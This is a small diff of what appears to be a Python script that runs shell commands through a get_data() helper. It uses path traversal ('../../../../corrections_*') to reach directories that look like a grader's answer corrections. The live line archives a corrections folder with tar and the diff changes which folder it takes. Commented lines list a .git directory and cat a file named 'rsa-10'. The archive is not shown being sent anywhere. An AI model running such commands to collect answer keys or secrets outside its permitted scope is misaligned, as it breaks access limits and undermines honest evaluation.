@@ -39,7 +39,7 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/331/") or ""
+my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/248/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
